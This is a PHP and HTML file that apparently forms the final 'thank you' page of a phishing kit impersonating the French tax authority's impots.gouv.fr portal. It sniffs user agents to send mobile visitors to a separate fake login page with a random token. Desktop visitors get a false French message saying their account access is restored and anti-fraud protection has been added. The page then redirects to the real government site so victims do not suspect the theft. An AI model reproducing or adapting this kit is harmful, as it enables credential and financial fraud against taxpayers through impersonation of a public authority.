<?
date_default_timezone_set('UTC');

$rand="0123456789abcdefghijklmnopqrstuvwxyz";

/// Code Detect mobile/tablet/pc
$tablet_browser = 0;
$mobile_browser = 0;
 
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
    $tablet_browser++;
}
 
if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
    $mobile_browser++;
}
 
if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) {
    $mobile_browser++;
}
 
$mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'], 0, 4));
$mobile_agents = array(
    'w3c ','acs-','alav','alca','amoi','audi','avan','benq','bird','blac',
    'blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno',
    'ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-',
    'maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-',
    'newt','noki','palm','pana','pant','phil','play','port','prox',
    'qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar',
    'sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-',
    'tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','wapp',
    'wapr','webc','winw','winw','xda ','xda-');
 
if (in_array($mobile_ua,$mobile_agents)) {
    $mobile_browser++;
}
 
if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {
    $mobile_browser++;
    //Check for tablets on opera mini alternative headers
    $stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
    if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {
      $tablet_browser++;
    }
}
 
if ($tablet_browser > 0) {
   // do something for tablet devices
}
else if ($mobile_browser > 0) {
   // do something for mobile devices
?><meta http-equiv="Refresh" content="0; url=mobile/LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?
}
else {
   // do something for everything else
}
/// End
?>
<!DOCTYPE HTML>
<html lang="fr" xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width; initial-scale=1; maximum-scale=1"><link rel="stylesheet" href="css/style.css"/>
<meta http-equiv="Refresh" content="3; url=https://cfspro.impots.gouv.fr">
<link rel="icon" href="images/favicon.ico"/>
<script src="js/telepaiement_continuer.js"></script>
<title>Merci</title>
</head>
<body>
<div style="width:100%;text-align:center;">
<center>
<table style="width:90%;">
<tr>
<td style="text-align:left;">
<img src="images/peka.svg" style="height:100pt;"/>
</td>
<td style="text-align:right;">
<a href=""><img src="images/safe.png" style="float:right;"/></a>
</td>
</tr>
</table>
</center>
</div>
<div style="width:100%;background-color:#e8e8e8;padding-top:9px;padding-bottom:35px;">
<center>
<table style="width:50%;color:black;">
<tr>
<td style="width:100%;">
<div style="margin-top:-11px;">
<div style="background:white;width:100%;border-radius:4px;">
<h1 class="titre"><img src="images/than.png"> Merci,Vous avez rétabli l'accès &agrave; votre compte</h1>
<center>
<form class="form01" method="post" action="" onsubmit="return validate();" onchange="return validate();">
<div class="alert" id="noureddyne_error">Les donn&eacute;es saisies sont incorrectes.
<br>
V&eacute;rifiez vos param&eacute;tres de connexion.
</div>
<br>
<br>
<div style="color: white;background: #5eba40;border-radius: 3px;font: 1em Arial, sans-serif;text-align: left;font-size: 14px;width: 387px;padding: 10px;">
Le nouveau syst&eacute;me de lutte contre la fraude a &eacute;t&eacute; ajout&eacute; avec succ&eacute;s &agrave; votre compte Impots. Maintenant, vous serez connecter &agrave; votre compte.
</div>
<br>
<br>
</td>
</tr>
</form>
</table>
</center>
</div>
<br>
<br>
<center>
<div style="color:black;font-size:14px;">Direction g&eacute;n&eacute;rale des Finances publiques</div>
</center>
<br>
<br>
</body>
</html>